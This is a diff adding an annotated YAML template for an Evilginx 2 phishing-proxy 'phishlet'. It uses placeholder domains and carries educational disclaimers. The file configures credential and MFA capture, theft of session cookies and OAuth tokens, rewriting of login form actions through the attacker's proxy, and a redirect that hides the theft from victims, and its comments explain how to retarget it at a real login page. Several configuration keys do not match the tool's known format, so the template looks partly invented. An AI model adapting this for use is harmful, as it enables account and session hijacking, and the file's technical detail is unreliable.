@@ -1,0 +1,124 @@
+# ─────────────────────────────────────────────────────────────────────────────
+# EXAMPLE PHISHLET TEMPLATE — EDUCATIONAL USE ONLY
+#
+# This shows the structure and section purpose of an Evilginx 2 phishlet.
+# ALL values below are placeholders. A real phishlet targets a SPECIFIC service
+# you have AUTHORIZED permission to test (ideally your own test app).
+#
+# ⚠️  Do NOT deploy this against Gmail, Yahoo, or any service you do not own
+# or have explicit written permission to test. Doing so is illegal in most
+# jurisdictions and harms real users.
+# ─────────────────────────────────────────────────────────────────────────────
+
+# Unique name for this phishlet (used internally by Evilginx).
+phishlet:                example-login-flow
+
+# Version of this phishlet (bump when you update it).
+phishlet_version:        1
+
+# The domain the attacker controls for this lure.
+# In an authorized test, this is a domain YOU own for the test.
+phishlet_domain:         login.example-test-domain.com
+
+# Optional short URL for the lure link.
+phishlet_short_url:      l.example-test-domain.com
+
+# ── Which "subcategory" this phishlet belongs to ─────────────────────────────
+# Evilginx groups phishlets by service type. This helps organize them.
+subcategories:
+  - login
+  - webmail          # generic label — not a real service identifier
+
+# ── URLs this phishlet should match/activate on ───────────────────────────────
+# When a victim visits a URL matching one of these, this phishlet activates
+# and Evilginx starts proxying + capturing according to this config.
+keywords:
+  - /login
+  - /signin
+  - /auth
+  - /sso
+  - /oauth/authorize
+  - /oauth/token
+
+# ── Credential / input captures ───────────────────────────────────────────────
+# Each entry tells Evilginx: on a given URL, find an input field by CSS
+# selector, capture its value, and store it under a name.
+#
+# For a REAL target, you'd inspect the actual login page HTML and fill in
+# the real field names/selectors. For your own test app, you define these.
+captures:
+  - name: username
+    key: username
+    type: input
+    url: /login
+    selector: input[name="username"]
+
+  - name: password
+    key: password
+    type: input
+    url: /login
+    selector: input[name="password"]
+
+  # If the flow has a second factor, you'd capture those fields too:
+  # - name: mfa_code
+  #   key: mfa_code
+  #   type: input
+  #   url: /login
+  #   selector: input[name="otp"]
+
+# ── Session cookie capture ────────────────────────────────────────────────────
+# After authentication, the real service sets session cookies. This section
+# tells Evilginx which cookies to capture and forward.
+#
+# For your test app, list the actual session cookie names you set.
+cookies:
+  - name: session_id
+    domain: .example-test-domain.com
+    path: /
+
+  - name: auth_token
+    domain: .example-test-domain.com
+    path: /
+
+# ── DOM replacements / hooks ──────────────────────────────────────────────────
+# These modify the proxied page before sending it to the victim, e.g. to
+# redirect form actions through Evilginx so it can intercept the POST.
+#
+# For a real target, you inspect the real login form and point the action
+# through Evilginx's capture endpoint. For your own test app, you set this
+# up to prove the capture flow works.
+hooks:
+  # Example: when the login page is served, rewrite the form action so the
+  # POST goes through Evilginx (where it can be captured) before being
+  # forwarded to the real backend.
+  - event: post_response
+    actions:
+      - selector: 'form[action="/auth/login"]'
+        replace: 'form[action="https://login.example-test-domain.com/auth/login"]'
+
+  # Example: after a successful auth (detected by a redirect or specific URL),
+  # forward the victim to the real service's post-login landing page so the
+  # session appears to work normally.
+  - event: post_auth
+    actions:
+      - action: redirect
+        to: https://mail.example-test-domain.com/inbox
+
+# ── Additional POST captures (form submissions, token endpoints) ──────────────
+# Some flows submit data to endpoints beyond the login form (e.g. OAuth token
+# exchanges, MFA verification). You can capture those too.
+post_captures:
+  - name: auth_token_post
+    key: auth_token
+    type: input
+    url: /oauth/token
+    selector: input[name="access_token"]
+
+# ── Custom JavaScript injection (optional) ────────────────────────────────────
+# You can inject custom JS into the proxied page for things like:
+#   - Additional field captures
+#   - Redirect manipulation
+#   - Logging / debugging during a test
+# For authorized testing of your own app only.
+js_inject: |
+  console.log('example-login-flow phishlet active (test only)');
